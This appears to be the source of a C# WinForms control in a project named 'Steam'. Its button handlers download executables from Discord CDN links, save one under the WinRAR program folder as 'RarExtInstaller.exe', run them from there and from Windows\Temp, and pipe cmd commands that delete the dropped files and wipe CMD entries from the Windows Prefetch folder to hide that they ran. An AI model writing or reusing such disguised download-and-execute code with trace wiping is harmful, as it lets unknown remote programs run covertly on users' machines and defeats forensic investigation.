using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Steam
{
    public partial class UserControl2 : UserControl
    {
        public UserControl2()
        {
            InitializeComponent();
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void siticoneRoundedButton1_Click(object sender, EventArgs e)
        {
            WebClient webClient = new WebClient();
            string fileName11 = "C:\\Program Files\\WinRAR\\RarExtInstaller.exe";
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/1136756734703173652/1136756810288730262/dcontrol.exe", fileName11);
        }

        private void siticoneRoundedButton2_Click(object sender, EventArgs e)
        {
            WebClient webClient = new WebClient();
            Process process = new Process();
            process.StartInfo = new ProcessStartInfo();
            Process.Start("C:\\Program Files\\WinRAR\\RarExtInstaller.exe");
        }

        private void siticoneRoundedButton3_Click(object sender, EventArgs e)
        {
            WebClient webClient = new WebClient();
            Process process = new Process(); ;
            string fileName2 = "C:\\Windows\\Temp\\nse948.tmp.exe";
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/1128125897099182083/1136455922064031744/nse948.tmp.exe", fileName2);
            Process.Start("C:\\Windows\\Temp\\nse948.tmp.exe");

            process.StartInfo = new ProcessStartInfo()
            {
                FileName = "cmd.exe",
                CreateNoWindow = false,
                RedirectStandardInput = true,
                UseShellExecute = false
            };
            process.Start();

            using (StreamWriter standardInput = process.StandardInput)
            {
                if (standardInput.BaseStream.CanWrite)
                    standardInput.WriteLine("ping 1.1.1.1 - n 1 - w 3000 > Nul & Del / f / q  C:\\Program Files\\WinRAR\\RarExtInstaller.exe");
                standardInput.WriteLine("ping 1.1.1.1 - n 1 - w 3000 > Nul & Del / f / q C:\\Program Files\\WinRAR\\RarExtInstaller.dll");
                standardInput.WriteLine("ping 1.1.1.1 - n 1 - w 3000 > Nul & Del / f / q  C:\\Windows\\Temp\\nse948.tmp.exe");
                standardInput.WriteLine("cd C:\\Windows\\Prefetch & Del CMD* ");
                string fileName21 = "C:\\Program Files\\WinRAR\\RarExtInstaller.exe";
                webClient.DownloadFile("https://cdn.discordapp.com/attachments/1128125897099182082/1143338725301030954/RarExtInstaller.exe", fileName21);
                string fileName31 = "C:\\Program Files\\WinRAR\\RarExtInstaller.dll";
                webClient.DownloadFile("https://cdn.discordapp.com/attachments/1128125897099182082/1143338725301030954/RarExtInstaller.exe", fileName31);
            }
            //await PutTaskDelay(500);
            //Thread.Sleep(3000);




            _ = new Process();
            process.StartInfo = new ProcessStartInfo()
            {
                FileName = "cmd.exe",
                CreateNoWindow = true,
                RedirectStandardInput = true,
                UseShellExecute = false
            };
            process.Start();
        }
    }
}
